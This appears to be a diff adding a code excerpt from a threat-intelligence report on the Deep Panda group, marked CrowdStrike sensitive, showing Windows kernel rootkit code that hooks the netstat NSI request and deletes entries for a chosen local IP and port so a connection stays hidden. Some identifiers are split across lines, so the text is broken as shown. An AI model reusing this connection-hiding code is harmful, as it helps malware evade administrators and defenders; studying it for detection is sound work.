@@ -1,0 +1,42 @@
+DEEP PANDA
+nsiParam = Irp->UserBuffer;
+if(MmIsAddressValid(nsiParam->lpMem))
+{
+//
+// netstat will involve internal calls which will use
+// nsiParam structure
+//
+if( (nsiParam->UnknownParam8 == 0x38))
+{
+KAPC_STATE apcstate;
+PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)nsiParam->lpStatus;
+PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)nsi
+Param->lpMem;
+int nItemCnt = nsiParam->TcpConnCount;
+KeStackAttachProcess(pCtx->pcb,&apcstate);
+//
+//make sure we are in the context of original process
+//
+for(i = 0;i < nItemCnt;i ++)
+{
+if((pTcpEntry[i].localEntry.dwIP == gLocalIp)&&(pTcpEntry[i].localEn
+try.Port == gLocalPort))
+{
+//
+//NSI will map status array entry to tcp table array entry
+//we must modify both synchronously
+//
+RtlCopyMemory(&pTcpEntry[i],&pTcpEntry[i+1],sizeof(INTERNAL_TCP_TA
+BLE_ENTRY)*(nItemCnt-i));
+RtlCopyMemory(&pStatusEntry[i],&pStatusEntry[i+1],sizeof(NSI_STA
+TUS_ENTRY)*(nItemCnt-i));
+nItemCnt--;
+nsiParam->TcpConnCount --;
+i--;
+}
+}
+KeUnstackDetachProcess(&apcstate);
+}
+}
+}
+CROWDSTRIKE S E N S I T I V E 36
